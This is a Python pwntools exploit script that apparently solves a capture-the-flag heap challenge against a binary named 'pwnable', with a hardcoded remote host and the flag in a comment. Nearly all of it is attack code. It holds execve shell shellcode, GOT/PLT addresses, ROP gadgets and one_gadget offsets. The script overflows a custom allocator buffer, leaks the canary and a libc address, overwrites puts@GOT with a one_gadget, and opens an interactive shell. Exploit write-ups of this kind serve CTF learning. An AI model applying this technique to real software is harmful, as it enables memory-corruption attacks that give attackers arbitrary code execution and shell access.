#!/usr/bin/env python

from pwn import *
import sys
import time
import argparse
import string

# ============================================================== #
# ========================== SETTINGS ========================== #
# ============================================================== #

context.arch = 'amd64' # [ amd64 | i386 ]
context.os = 'linux'
context.endian = 'little'
context.word_size = 64 # [ 64 | 32]
# ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
context.log_level = 'INFO'

# ============================================================== #
# ========================== TEMPLATE ========================== #
# ============================================================== #


SHELLCODE64 = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" # 27bytes len
SHELLCODE32 = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" # 23bytes len
WORD32 = 'A'*4    # 32bit
WORD64 = 'X'*8   # 64bit
payload = ''
data = ''

program_name = './pwnable'
binary = ELF(program_name)

remote_server = '13.233.66.116'
PORT = 6000

parser = argparse.ArgumentParser(description='Exploit the bins.')
parser.add_argument('--dbg'   , '-d', action="store_true")
parser.add_argument('--remote', '-r', action="store_true")
parser.add_argument('--lib', '-l', action="store_true")
args = parser.parse_args()

if args.remote:
    p = remote(remote_server, PORT)

else:
    # know libc
    if args.lib:
        libc = ELF("libc.so.6") #determin libc-version: ldd ./program_name
        p = process(program_name, env={'LD_PRELOAD' : libc.path})
    # don't know libc
    else:
        p = process(program_name)

if args.dbg:
    gdb.attach(p, '''
    vmmap
    b *main
    ''')

# ============ PLT =========== #

rintf_PLT = 0x4009b0
malloc_PLT = 0x400a10
putchar_PLT = 0x400940
puts_PLT = 0x400960
read_PLT = 0x4009e0
mmap_PLT = 0x400990
setbuf_PLT = 0x4009a0
memset_PLT = 0x4009c0
pthread_create_PLT = 0x400950
__isoc99_scanf_PLT = 0x400a30
write_PLT = 0x400970
free_PLT = 0x40092c
__libc_start_main_PLT = 0x4009f0
__stack_chk_fail_PLT = 0x400980
close_PLT = 0x4009d0
exit_PLT = 0x400a40
__gmon_start___PLT = 0x400a50
open_PLT = 0x400a20
memcpy_PLT = 0x400a00

# ============ GOT =========== #

alloc_GOT = 0x602088
memset_GOT = 0x602060
putchar_GOT = 0x602020
puts_GOT = 0x602030
stdout_GOT = 0x6020c0
read_GOT = 0x602070
mmap_GOT = 0x602048
printf_GOT = 0x602058
__isoc99_scanf_GOT = 0x602098
free_GOT = 0x602018
memcpy_GOT = 0x602080
write_GOT = 0x602038
exit_GOT = 0x6020a0
__libc_start_main_GOT = 0x602078
__stack_chk_fail_GOT = 0x602040
stderr_GOT = 0x6020e0
setbuf_GOT = 0x602050
close_GOT = 0x602068
pthread_create_GOT = 0x602028
open_GOT = 0x602090
__gmon_start___GOT = 0x601ff8

# ============================================================== #
# ====================== GADGETS & MAGIC ======================= #
 # ============================================================== #

pop_rdi = 0x0000000000001143 # pop rdi; ret;
pop_rsi = 0x0000000000001141 # pop rsi; pop r15; ret;
pop_rbp = 0x000000000000113b # pop rbp; pop r12; pop r13; pop r14; pop r15; ret;
pop_rbp = 0x000000000000113f # pop rbp; pop r14; pop r15; ret;
pop_rbp = 0x0000000000000ac0 # pop rbp; ret;
pop_rbp = 0x0000000000000b08 # pop rbp; ret;
pop_rbp = 0x0000000000000d4f # pop rbp; ret;
leave = 0x0000000000000cc0 # leave; ret;
leave = 0x0000000000000de9 # leave; ret;
leave = 0x0000000000000e49 # leave; ret;
leave = 0x0000000000000eb2 # leave; ret;
leave = 0x000000000000104a # leave; ret;
one_gag = [ 0x4526a, 0xf02a4, 0xf1147, 0 ]
sys_off = 0x45390
mal_hook_off = 0x3c4b10
free_hook_off = 0x3c67a8

# ============================================================== #
# ====================== USEFUL FUNCTIONS ====================== #
# ============================================================== #

def console_output():
    data = p.recv(2000)
    # print data

def send_data(payload):
    # print '[*] payload'
    p.sendline(payload)

def wait_for_prompt(sentence):
  print r.recvuntil(sentence)

def get_symbols(y):
    x = p32(binary.symbols[y])
    return x
    # Example: read_got = p32(binary.symbols["read"])

def get_libc_offset(x):
    off = libc.symbols[x]
    return off

def search_binsh():
    return libc.search("/bin/sh").next()

def create(size):
    p.sendlineafter('> ','1')
    p.sendlineafter('Enter buffer size:\n',str(size))

def do_print(index):
    p.sendlineafter('> ','2')
    p.sendlineafter('Enter index:\n',str(index))
    return p.recvline().strip()

def do_write(index, size, data):
    p.sendlineafter('> ','3')
    p.sendlineafter('Enter index:',str(index))
    p.sendlineafter('Enter size:',str(size))
    p.send(data)

# ============================================================== #
# ====================== FLOW OF PROGRAM ======================= #
# ============================================================== #

if __name__ == "__main__":

    block_count = 0x602104
    block_list = 0x602120

    create(100)
    create(100)

    # leak canary1 and libc
    payload = 'B'*100
    payload += p64(200)
    do_write(1, 100+8, payload)
    leak = do_print(1)
    chk1_canary = hex(u64(leak[108:116]));print 'Canary1=',chk1_canary
    libc = hex(int(hex(u64(leak[116:124])),16)+0x400000-0x84)
    print 'LIBC=',libc

    # overwrite chk1 str pointer
    payload = 'A'*100
    payload += p64(200)
    payload += p64(int(chk1_canary,16))
    payload += p64(puts_GOT)
    do_write(1, 100+8*3, payload)

    # overwrite puts@GOT with system
    print 'ONE-GAG:',hex(int(libc,16)+0x45216)
    do_write(1, 8, p64(int(libc,16)+0x45216))


    # ============ GDB =========== #


    p.interactive()
    # flag{cust0m_m4ll0c_4_tw}

# ============================================================== #
# =========================== SKETCH =========================== #
# ============================================================== #
'''
0x45216	execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a	execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4	execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147	execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

system:0x45390
execve:0xcc770
'''
